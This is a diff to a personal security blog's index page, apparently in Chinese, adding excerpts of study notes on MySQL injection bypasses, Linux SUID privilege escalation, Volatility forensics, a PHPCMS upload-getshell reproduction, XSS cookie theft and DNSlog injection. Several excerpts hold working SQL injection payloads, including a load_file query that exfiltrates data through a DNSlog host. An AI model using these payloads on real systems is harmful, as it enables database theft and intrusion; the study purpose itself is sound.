@@ -397,6 +397,310 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/" >
+            
+                <span>Mysql注入技巧备忘录</span>
+        </a>
+        <div class="abstract-content">
+            MYSQL一些技巧
+仅仅是作为自己备忘录，如果错误，敬请斧正。
+
+0)基础饶过123456781.大小写绕过2.双写绕过3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;5.宽字节、Latin1默认编码Latin1编码：[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是如何处理这些字符的呢？直接忽略。于是我们可以输入?username&#x3D;admin%c2，存储至表中就变为了admin上面的%c2可以换为%c2-%ef之间的任意字符]
+1)过滤空格
+反引...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/07/17/Tryhackme%E8%AE%B0%E5%BD%95liunx%E6%8F%90%E6%9D%83/" >
+            
+                <span>Tryhackme记录liunx提权</span>
+        </a>
+        <div class="abstract-content">
+            Tryhackme学习liunx提权
+
+
+LinEnum 是一个简单的 bash 脚本，它执行与权限提升相关的常见命令，从而节省时间并允许投入更多精力来获取 root 权限https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+一、滥用SUIID/GUID文件查找和利用 SUID 文件
+
+Linux 提权利用的第一步是检查设置了 SUID/GUID 位的文件。这意味着可以使用文件所有者/组的权限运行一个或多个文件。在这种情况下，作为超级用户。我们可以利用它来获得具有这些权限的 shell！
+
+ 什么是 SUID 二进制文...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/17</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/07/17/Volatility/" >
+            
+                <span>Volatility</span>
+        </a>
+        <div class="abstract-content">
+            #Volatility学习
+
+查看活动进程，我们还可以查看创建镜像时的活动网络连接！现在让我们使用命令 volatility -f MEMORY_FILE.raw --profile=PROFILE netscan 来执行此操作。
+
+
+恶意软件试图隐藏自身以及与之关联的进程是很常见的。话虽如此，我们可以通过命令 psxview 查看有意隐藏的进程
+
+
+除了通过 psxview 查看隐藏进程之外，我们还可以通过命令“ldrmodules”更加专注地检查这一点。这里中间会出现三列，InLoad、InInit、InMem。如果其中任何一个是错误的，则该模块可能已被注入，这是一件非常糟糕的事情。...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/17</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/07/17/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >
+            
+                <span>PHPCMSV9版本代码审计学习</span>
+        </a>
+        <div class="abstract-content">
+            学习代码审计，自己简单记录一下。如有错误望师傅斧正。
+PHPCMS预备知识PHPCMS是采用MVC设计模式开发,基于模块和操作的方式进行访问，采用单一入口模式进行项目部署和访问，无论访问任何一个模块或者功能，只有一个统一的入口。
+
+
+
+参数名称
+描述
+位置
+备注
+
+
+
+m
+模型/模块名称
+phpcms/modules中模块目录名称
+必须
+
+
+c
+控制器名称
+phpcms/modules/模块/*.php 文件名称
+必须
+
+
+a
+事件名称
+phpcms/modules/模块/*.php 中方法名称
+
+
+
+PHPCMSV9.2上传Getshell漏洞复现我们搭建好环境直接注册，找到修改头像。...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/05/17/Mysql-Join%E6%B3%A8%E5%85%A5/" >
+            
+                <span>Mysql_Join注入技巧</span>
+        </a>
+        <div class="abstract-content">
+            Join注入技巧join无名列报错注入约束条件
+
+在知到表名的前提下才能操作
+
+注入语句
+1and extractvalue(1,concat(0x7e,(select * from (select * from users join users b using(id))c),0x7e))
+
+依次枚举即可
+Join代替order by [过滤了逗号]payload
+1union select * from (select 1) a join (select 2) b join (select 3) c%23
+
+
+
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/05/17/XSS%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/" >
+            
+                <span>XSS一些记录</span>
+        </a>
+        <div class="abstract-content">
+            XSS一些总结除了script以外大多标签自动加载触发JS代码大多用的都是on事件，以下标签都可以用下面的方法去打Cookie以及url等
+123456789101112131415161718192021常见标签&lt;img&gt;&lt;input&gt;&lt;details&gt;&lt;svg&gt;&lt;select&gt;&lt;iframe&gt;&lt;video&gt;&lt;audio&gt;&lt;textarea&gt;  &lt;body&gt;&lt;Style&gt;&lt;Media&gt;such as: 其他的标签自动触发百度一下就好了&lt;b...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "XSS">XSS</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/05/12/DNSlog%E6%B3%A8%E5%85%A5/" >
+            
+                <span>DNSlog注入</span>
+        </a>
+        <div class="abstract-content">
+            文章推荐:
+
+https://www.anquanke.com/post/id/98096
+https://www.cnblogs.com/-qing-/p/10623583.html
+
+推荐平台:
+
+http://www.dnslog.cn  //不需要登录账户注册 速度快一点 简单测试推荐
+http://admin.dnslog.link
+http://ceye.io
+
+
+payload:
+and if((select load_file(concat(‘//‘,(语句 limit 0,1),’.xxxx.dnslog.cn\aaa’))),1,1)–+
+
+BugscanTeam 项...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/12</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/05/11/Mysql%E4%B8%80%E4%BA%9B%E5%A4%87%E5%BF%98%E5%BD%95/" >
+            
+                <span>Mysql注入一些备忘录</span>
+        </a>
+        <div class="abstract-content">
+             Mysql注入一些备忘录
+
+获取信息函数12345database() 获取当前数据库名user()     获取当前用户version()  获取当前版本@@datadir  数据库路径  反猜路径@@version_compile_os 操作系统 
+
+Union查询1234567891011121314查表union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;0x74657374(数据库名test的Hex) limit 0,1--+查字段union select 1,co...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/11</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" >
             
                 <span>CTF反序列字符串逃逸</span>
@@ -641,9 +945,91 @@ Msf后渗透测试阶段做什么
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 2
+        Total : 10
         </div>
         <!-- search  -->
         
@@ -656,6 +1042,46 @@ Msf后渗透测试阶段做什么
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/" >Mysql注入技巧备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Tryhackme%E8%AE%B0%E5%BD%95liunx%E6%8F%90%E6%9D%83/" >Tryhackme记录liunx提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/Volatility/" >Volatility</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2021/07/17/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >PHPCMSV9版本代码审计学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2021/05/17/Mysql-Join%E6%B3%A8%E5%85%A5/" >Mysql_Join注入技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2021/05/17/XSS%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/" >XSS一些记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2021/05/12/DNSlog%E6%B3%A8%E5%85%A5/" >DNSlog注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span><a class="archive-post-title" href= "/2021/05/11/Mysql%E4%B8%80%E4%BA%9B%E5%A4%87%E5%BF%98%E5%BD%95/" >Mysql注入一些备忘录</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -674,7 +1100,13 @@ Msf后渗透测试阶段做什么
     
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
         <span class="sidebar-tag-name" data-tags="meterpreter"><span class="iconfont-archer">&#xe606;</span>meterpreter</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
